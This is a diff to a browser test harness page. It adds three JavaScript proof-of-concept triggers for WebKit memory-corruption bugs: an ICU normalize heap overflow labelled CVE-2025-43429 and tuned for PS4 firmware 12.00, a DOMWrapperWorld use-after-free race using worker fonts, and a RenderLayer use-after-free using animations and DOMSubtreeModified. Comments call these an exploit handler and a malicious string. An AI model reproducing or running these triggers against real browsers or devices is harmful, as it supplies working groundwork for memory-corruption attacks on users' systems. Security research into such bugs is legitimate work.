@@ -228,7 +228,10 @@
         <button onclick="addLog('Running Test 214...'); test214_NodeContainsSelf()">Test 214: Node Contains Self</button>
         <button onclick="addLog('Running Test 215...'); test215_TreeWalkerPrev()">Test 215: TreeWalker Previous</button>
         <button onclick="addLog('Running Test 216...'); test216_CryptoFlood()">Test 216: Crypto Flood</button>
-        <button onclick="addLog('Running Test 217...'); test217_FinalChaos()">Test 217: FINAL CHAOS</button>
+        <button onclick="addLog('Running Test 217...'); test217_FinalChaos()">Test 217: FINAL CHAOS</button>        
+        <button onclick="addLog('Running Test 218...'); test218_ICUNormalizeOverflow()">Test 218: ICU Normalize (CVE-2025-43429)</button>
+        <button onclick="addLog('Running Test 219...'); test219_DOMWrapperWorldUAF()">Test 219: DOMWrapperWorld UAF</button>
+        <button onclick="addLog('Running Test 220...'); test220_RenderLayerUAF()">Test 220: RenderLayer UAF</button>
     </div>
     
 
@@ -5700,6 +5703,126 @@
                 testArea.innerHTML = 'CLEARED';
             } catch(e) {
                 addLog('Test 217 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+        // TEST 218: ICU Heap Buffer Overflow / OOM (CVE-2025-43429)
+        // Tweaked for PS4 12.00
+        function test218_ICUNormalizeOverflow() {
+            addLog('TEST 218: String.prototype.normalize Heap Overflow/OOM');
+            try {
+                // Parâmetros ajustados para o PS4 conforme PoC
+                let len = 0x7FFFFFF0;
+                let numExpandChars = 16;
+                let fillLen = len - numExpandChars;
+                
+                let expandChar = "\u00A8";
+                let fillChar = "a";
+                let compatFactor = 0.626; // High memory pressure factor
+                
+                addLog('Allocating massive string...');
+                
+                // Construção da string maliciosa
+                let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * compatFactor));
+                
+                addLog('Triggering normalize (This may freeze/crash)...');
+                
+                // O crash ocorre aqui
+                let normalized = largeStr.normalize('NFKC');
+                
+                addLog('Normalization finished (No crash?)');
+            } catch(e) {
+                addLog('Test 218 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 219: WebCore::DOMWrapperWorld UAF (Worker Fonts)
+        function test219_DOMWrapperWorldUAF() {
+            addLog('TEST 219: DOMWrapperWorld UAF via Worker fonts');
+            try {
+                let workerBlob = `
+                async function runTest() {
+                    try {
+                        var fontFaceSet = await self.fonts.ready;
+                        fontFaceSet.onloadingdone = () => { };
+                        postMessage("ready");
+                    } catch(e) {}
+                }
+                runTest();
+                `;
+                
+                let blobURL = self.URL.createObjectURL(new Blob([workerBlob], { type: 'text/javascript' }));
+                let worker = new Worker(blobURL);
+                
+                worker.onmessage = () => {
+                    // Race condition: Terminate worker while it holds references to font wrapper worlds
+                    worker.terminate();
+                    addLog('Worker terminated (Triggering UAF conditions)');
+                    
+                    // Cleanup attempt
+                    setTimeout(() => {
+                        self.URL.revokeObjectURL(blobURL);
+                    }, 200);
+                };
+            } catch(e) {
+                addLog('Test 219 Exception: ' + e.message, true);
+                crashes++;
+            }
+        }
+
+        // TEST 220: WebCore RenderLayer ComputeCompositingRequirements UAF
+        function test220_RenderLayerUAF() {
+            addLog('TEST 220: RenderLayer UAF via Animation/SubtreeMod');
+            try {
+                // 1. Injetar CSS necessário
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes keyframes {}
+                    cite { animation: keyframes 100ms infinite; }
+                `;
+                document.head.appendChild(style);
+
+                // 2. Construir estrutura DOM
+                const object = document.createElement('object');
+                object.type = "image/png";
+                
+                const cite = document.createElement('cite');
+                const dl = document.createElement('dl');
+                dl.hidden = true;
+                
+                object.appendChild(cite);
+                object.appendChild(dl);
+                testArea.appendChild(object);
+
+                // 3. Handler do Exploit
+                function subtreeModified() {
+                    try {
+                        const animation = cite.getAnimations()[0];
+                        if (animation) {
+                            object.width = "1em";
+                            // Acesso crítico para triggerar o cálculo de camadas
+                            const temp = object.codeBase; 
+                            animation.effect = new KeyframeEffect(dl, { });
+                        }
+                    } catch(err) {
+                        console.log(err);
+                    }
+                }
+
+                // 4. Armar gatilho
+                object.addEventListener("DOMSubtreeModified", subtreeModified);
+                
+                // 5. Disparar
+                object.data = "x";
+                
+                // Cleanup style após execução (se não crashar)
+                setTimeout(() => {
+                    if(document.head.contains(style)) document.head.removeChild(style);
+                }, 1000);
+
+            } catch(e) {
+                addLog('Test 220 Exception: ' + e.message, true);
                 crashes++;
             }
         }
